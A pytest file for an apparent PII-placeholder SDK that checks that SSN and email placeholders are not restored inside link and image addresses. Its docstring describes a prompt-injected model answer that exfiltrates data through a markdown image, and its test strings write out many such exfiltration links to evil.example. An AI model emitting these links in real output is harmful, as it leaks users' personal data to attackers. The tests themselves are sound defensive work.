"""Gap G1: placeholders inside link and image addresses are not restored.

An injected ``![x](https://attacker.example/?d=<SSN_1>)`` in a model answer
must not become a link that carries the real value."""

from __future__ import annotations

import pytest

from taintward.core.doe import Sensitivity
from taintward.sdk import placeholders as ph
from taintward.sdk.integrations import Ward


def _map(**kw) -> ph.PlaceholderMap:
    m = ph.PlaceholderMap(**kw)
    m.placeholder_for("234-12-1234", "US_SSN", Sensitivity.PII)
    m.placeholder_for("bob@example.com", "EMAIL_ADDRESS", Sensitivity.PII)
    return m


@pytest.mark.parametrize("text", [
    "![x](https://evil.example/?d=<SSN_1>)",
    "[click](https://evil.example/<SSN_1>)",
    "[a](<https://evil.example/?d= <SSN_1>>)",
    '<img src="https://evil.example/?a= <SSN_1>">',
    "<a href='https://evil.example/?x=<SSN_1>'>x</a>",
    "https://evil.example/?d=SSN_1",
    "www.evil.example/<SSN_1>",
    "mailto:<EMAIL_1>",
    "[1]: https://evil.example/<SSN_1>",
])
def test_link_address_keeps_placeholder(text):
    m = _map()
    assert m.restore_text(text) == text
    assert len(m.diagnose(text)["blocked"]) == 1


@pytest.mark.parametrize("text, want", [
    ("Your SSN is <SSN_1>.", "Your SSN is 234-12-1234."),
    ("see https://docs.example.com for <SSN_1>", "see https://docs.example.com for 234-12-1234"),
    ("[docs](https://x) then <SSN_1>", "[docs](https://x) then 234-12-1234"),
    ("metadata: <SSN_1>", "metadata: 234-12-1234"),
])
def test_plain_text_next_to_links_is_restored(text, want):
    assert _map().restore_text(text) == want


def test_tool_call_json_checks_each_string():
    m = _map()
    args = '{"url": "https://e.example/?q=<EMAIL_1>", "to": "<EMAIL_1>"}'
    assert m.restore_text(args) == '{"url": "https://e.example/?q=<EMAIL_1>", "to": "bob@example.com"}'
    assert m.diagnose(args)["blocked"] == ["<EMAIL_1>"]


def test_before_carries_a_link_from_an_earlier_chunk():
    m = _map()
    assert m.restore_text("<SSN_1>)", before="![x](https://evil.example/?d=") == "<SSN_1>)"
    assert m.restore_text("<SSN_1>", before="hello ") == "234-12-1234"


def test_strict_mode_does_not_raise_for_blocked(caplog):
    found = ph.check_output(_map(), "![x](https://e.example/<SSN_1>)", strict=True)
    assert found["blocked"] == ["<SSN_1>"]
    assert "link addresses" in caplog.text


def test_option_and_env_turn_it_off(monkeypatch):
    assert _map(restore_in_urls=True).restore_text("https://crm.example/<SSN_1>") \
        == "https://crm.example/234-12-1234"
    monkeypatch.setenv("TAINTWARD_RESTORE_IN_URLS", "1")
    assert _map().restore_in_urls is True


def test_ward_passes_the_option_to_its_maps():
    ward = Ward(placeholder_restore_in_urls=True)
    with ward.run():
        assert ph.current().restore_in_urls is True
    assert ward.with_overrides({"t": "internal"}).new_placeholder_map().restore_in_urls is True
    assert Ward().new_placeholder_map().restore_in_urls is False


def test_adk_stream_chunks_see_earlier_text():
    pytest.importorskip("google.adk")
    from google.genai import types

    from taintward.sdk.integrations.google_adk import _restore_partial

    m = _map()
    seen = ""
    out = []
    for piece in ["![x](https://evil.example/?d=", "<SSN_1>) and <EMAIL_1>"]:
        content = types.Content(role="model", parts=[types.Part(text=piece)])
        seen = _restore_partial(m, content, seen)
        out.append(content.parts[0].text)
    assert "".join(out) == "![x](https://evil.example/?d=<SSN_1>) and bob@example.com"


def test_llamaindex_delta_sees_earlier_text():
    pytest.importorskip("llama_index.core")
    from llama_index.core.base.llms.types import ChatMessage, ChatResponse

    from taintward.sdk.integrations.llamaindex import _restore_response

    resp = ChatResponse(message=ChatMessage(role="assistant",
                                            content="![x](https://evil.example/?d=<SSN_1>"),
                        delta="<SSN_1>")
    resp = _restore_response(resp, _map())
    assert resp.delta == "<SSN_1>"
    assert resp.message.content == "![x](https://evil.example/?d=<SSN_1>"
